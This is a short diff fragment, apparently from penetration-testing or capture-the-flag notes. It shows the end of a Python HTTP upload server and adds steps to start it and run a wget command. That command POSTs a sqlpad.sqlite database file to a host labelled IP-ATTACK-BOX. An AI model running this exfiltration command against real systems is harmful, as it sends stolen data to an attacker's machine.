@@ -52,3 +52,11 @@ if __name__ == "__main__":
     print(f"Server running on http://{host}:{port}")
     server = HTTPServer((host, port), SQLiteUploadHandler)
     server.serve_forever()
+
+----------------------------------
+Start Python-Server
+
+python3 post_server.py
+Transfer File
+
+wget --method=POST --body-file=sqlpad.sqlite http://IP-ATTACK-BOX:8000/
